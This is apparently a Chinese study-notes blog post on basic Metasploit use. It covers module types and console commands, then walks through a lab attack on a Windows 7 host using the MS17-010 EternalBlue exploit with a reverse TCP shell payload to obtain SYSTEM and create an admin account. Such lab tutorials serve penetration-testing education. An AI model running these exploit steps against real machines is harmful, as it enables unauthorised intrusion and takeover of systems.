---
layout:     post
title:      Metasploit渗透测试框架的基本使用
subtitle:  学习笔记
date:       2023-4-8
author:     Draper-crypto
header-img: img/blogimg/post-Java-alibaba.jpg
catalog: true
tags:
    - Metasploit
    - 渗透测试
    - 学习笔记
---

## 一、Metasploit 渗透测试框架介绍

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320622.webp)

### （1）基础库

metasploit基础库文件位于源码根目录路径下的libraries目录中，包括Rex,framework-core和framework-base三部分。

**Rex**是整个框架所依赖的最基础的一些组件，如包装的网络套接字、网络应用协议客户端与服务端实现、日志子系统、渗透攻击支持例程、PostgreSQL以及MySQL数据库支持等；

**framework-core库**负责实现所有与各种类型的上层模块及插件的交互接口；

**framework-base库**扩展了framework-core，提供更加简单的包装例程，并为处理框架各个方面的功能提供了一些功能类，用于支持用户接口与功能程序调用框架本身功能及框架集成模块；

### （2）模块

模块组织按照不同的用途分为6种类型的模块（Modules）：分为辅助模块（Aux)、渗透攻击模块（Exploits)、后渗透攻击模块（Post)、攻击载荷模块（payloads)、编码器模块（Encoders)、空指令模块（Nops)。

> 注：payload又称为攻击载荷，主要是用来建立目标机与攻击机稳定连接的，可返回shell，也可以进行程序注入等。

### （3）插件

插件能够扩充框架的功能，或者组装已有功能构成高级特性的组件。插件可以集成现有的一些外部安全工具，如Nessus、OpenVAS漏洞扫描器等，为用户接口提供一些新的功能。

### （4）接口

包括msfconsole控制终端、msfcli命令行、msfgui图形化界面、armitage图形化界面以及msfapi远程调用接口。

### （5）功能程序

metasploit还提供了一系列可直接运行的功能程序，支持渗透测试者与安全人员快速地利用metasploit框架内部能力完成一些特定任务。比如msfpayload、msfencode和msfvenom可以将攻击载荷封装为可执行文件、C语言、JavaScript语言等多种形式，并可以进行各种类型的编码。

## 二、基本使用方法

### 1.PostgreSQL数据库

Metasploit程序需要使用PostgreSQL数据库。

> 注：PostgreSQL是世界上最先进的开源关系数据

手动启动数据库

```powershell
root@kali:~# systemctl start postgresql
```
```powershell
root@kali:~# systemctl enable postgresql         #设置成开机启动数据库
```

### 2.启动Metasploit

（1）点击图标

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320641.webp)

（2）命令行启动

```powershell
root@kali:~# msfconsole
```

**注意：每次弹出的欢迎信息都是随机的。**

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320633.webp)

## 三、常用命令

### 1.connect 命令

connect 命令主要用于远程连接主机。一般用于内网渗透。比较常用的命令就是“connect 192.168.1.1 80” ,192.168.1.1是 IP 地址，80 是端口号。

**语法：**

```powershell
msf5 > connect <IP或域名> <端口号>
```

**例：**

```powershell
msf5 > connect 192.168.1.1 80       #192.168.1.1是 IP 地址，80 是端口号。
```

### 2.show命令

“show”命令的有效参数是：all, encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options **例：** 列出 metasploit 框架中的所有渗透攻击模块 exploits

```powershell
msf5 > show exploits            #列出 metasploit 框架中的所有渗透攻击模块。
```
```powershell
msf5 > show payloads            #列出 metasploit 框架中的所有攻击载荷。 
```
```powershell
msf5 > show auxiliary           #列出 metasploit 框架中的所有辅助攻击载荷。
```

### 3.search搜索命令

当你使用 msfconsole 的时候，你会用到各种漏洞模块、各种插件等等，search 搜索命令可以快速的查找到用户所需要的模块。

**语法：**

```powershell
msf5 > search [options] <keywords>      #search后主要加选项和关键字
```
```powershell
msf5 > search Keywords（参数）:关键字
```
```powershell
msf5 > search platform（平台）:mysql        #查询的结果会列出 rank 比较高的模块
```
```powershell
msf5 > search type（类型）:特定类型的模块
```
```powershell
msf5 > search name:mysql type:exploit   #联合查找，多条件组合
```

**注意：**

①特定类型模块有exploit、payload、auxiliary、encoder、evasion、post、or nop。

②搜索参数可以组合使用，可以更精准的查询到对应的模块，支持模糊查找，不区分大小写。

③查询结果每列的含意是： Name 名称 Disclosure 披露 Date 日期 Rank 排名 Check 检查 Description 说明

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320632.webp)

**例：** 例1：通过 name 关键字进行查找

```powershell
msf5 > search mysql                 # search 后直接跟要查找内容。
```

例2：查找出ms08_067 漏洞模块

```powershell
msf5 > search ms08_067
```

例3：查找 mysql 数据库的漏洞

```powershell
msf5 > search name:mysql
```

### 4.use命令

use 使用参数。当你要使用（装载）某个模块，就要使用到 use 命令。 **语法：**

```powershell
use <模块的名字>
```

**例：** 装载一个渗透攻击模块

```powershell
msf5 > use exploit/windows/smb/ms08_067_netapi
```

我们可以看到使用 use 装载模块后我们的 bash 提示符会变成对应的模块信息。

**退出当前调用模块**

```powershell
msf5 exploit(windows/smb/ms08_067_netapi) > back
```

### 5.info命令

显示模块的相关信息。

**语法：**

```powershell
方法1：info <模块名称>
例：msf5 > info exploit/windows/smb/ms08_067_netapi 
```
```powershell
方法2：use 装载模块后直接使用info
例：msf5 > use exploit/windows/smb/ms08_067_netapi
```

使用后弹出的内容里我们可以得知：

（1）可用目标，即查看可以攻击哪些操作系统

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320627.webp)

（2）Basic options: 调用漏洞需要的相关参数

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320677.png)

（3）漏洞描述和执行过程

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320157.webp)

（4）参考文档

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320189.png)

### 6.show命令

show命令可以查看模块的相关信息

```powershell
msf5 exploit(windows/smb/ms08_067_netapi) > show options    #查看模块的选项
```
```powershell
msf5 exploit(windows/smb/ms08_067_netapi) > show targets    #查看可以攻击哪些操作系统
```
```powershell
msf5 exploit(windows/smb/ms08_067_netapi) > set RHOST 192.168.1.54  #设置攻击地址参数
```
```powershell
msf5 exploit(windows/smb/ms08_067_netapi) > show options        #查看设置的值
```

配置好了之后我们输入 exploit 或 run 就可以执行该模块。

### 7.exploit命令

```powershell
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit -j     #-j 表示后台执行,渗透目标完成后会创建一个 session 我们可以通过 session 连接目标主机。
```
```powershell
msf5 exploit(windows/smb/ms17_010_eternalblue) > sessions   #查看会话详细信息
```
```powershell
msf5 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 4      #通过会话 Id 进入会话
```
```powershell
C:\Windows\system32>background      #退出会话将会话保存到后台
```
```powershell
msf5 exploit(windows/smb/ms17_010_eternalblue) > sessions -k 4      #根据会话 Id 结束会话
```

## 实践1：使用 msf 渗透攻击 Win7 主机并远程执行命令

### 1.概述

攻击机器：kali Linux（IP:192.168.2.16）

被攻击机器：windows 7专业版（IP:192.168.2.173）

利用漏洞：ms17-010漏洞
使用shell：payload/windows/x64/shell/reverse_tcp

**注意：在开始攻击前互ping主机，确保网络联通，windows 7主机在被攻击前请关闭防火墙，否则无法完成攻击。**

### 2.攻击过程

**（1）搜索对应的扫描模块**

```powershell
msf5 > search ms17-010
```

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320206.webp)

**（2）使用扫描模块**

```powershell
msf5 > use auxiliary/scanner/smb/smb_ms17_010
```

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320204.webp)

**（3）查看需要配置的选项**

```powershell
msf5 auxiliary(scanner/smb/smb_ms17_010) > show options
```

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320236.webp)

**（4）配置PHOSTS的IP**

```powershell
msf5 auxiliary(scanner/smb/smb_ms17_010) > set rhosts 192.168.2.173
```

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320231.png)

**（5）检查所有选项是否配置完成**

```powershell
msf5 auxiliary(scanner/smb/smb_ms17_010) > show options
```

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320935.webp)

**（6）开始扫描**

```powershell
msf5 auxiliary(scanner/smb/smb_ms17_010) > run
```

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320939.webp)

显示“Host is likely VULNERABLE to MS17-010!（主机可能易受MS17-010攻击!） ”则表示该主机存在该漏洞。


**（7）返回，重新查找我们需要的攻击模块**

```powershell
msf5 auxiliary(scanner/smb/smb_ms17_010) > back
```
```powershell
msf5 > search ms17-010
```

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320993.webp)

**（8）同理使用模块，展示需要配置的参数**

```powershell
msf5 > use exploit/windows/smb/ms17_010_eternalblue
```
```powershell
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options
```

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320971.webp)

**（9）配置参数，检查参数**

```powershell
msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.2.173
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options
```

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320966.webp)

**（10）查看exploit target 目标类型**

```powershell
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options
```

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320999.webp)

在这里插入图片描述

可以看到这个模块只有一个 target，所以默认就选择这个目标系统，不需要手动设置。

**（11）找一个 payload**，为了获取 shell 远程连接权限后，进行远程执行命令

```powershell
msf5 exploit(windows/smb/ms17_010_eternalblue) > search windows/x64/shell type:payload
```

> 注：payload 又称为攻击载荷，主要是用来建立目标机与攻击机稳定连接的，可返回 shell，也可以进行程序注入等。

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320785.webp)

**（12）设置使用的payload，查看payload所需要的参数**

```powershell
msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload
 windows/x64/shell/reverse_tcp                                                    
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options
```

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320824.webp)

**（13）设置payload的反弹地址**

```powershell
msf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.2.16
```

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320849.png)

**（14）检查参数有无问题，** 没有问题直接run

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320891.webp)

**（15）攻击成功，显示出windows命令行**

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320888.webp)

注意：若停在上图WIN字符区域，不是没有攻击成功，仅需按下回车即可

### 3.测试攻击是否成功

**（1）在kali端尝试查看当前Windows 7用户**

![img](https://pic1.zhimg.com/80/v2-0978d163a10da7c256775bf1aa5a64fc_720w.webp)

发现显示乱码，解决办法在命令行输入`chcp 65001`即可，再次查看

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320998.webp)

显示正常。

**（2）新建用户admin**

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320594.webp)

到windows端查看是否成功

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320629.webp)

成功创建admin用
**（3）通过whoami查看当前用户级别，可以发现我们获取到了最高权限system**

![img](https://typora-img-1301299232.cos.ap-shanghai.myqcloud.com/img/202305101320623.webp)

> 注：关闭连接按下ctrl+c即可
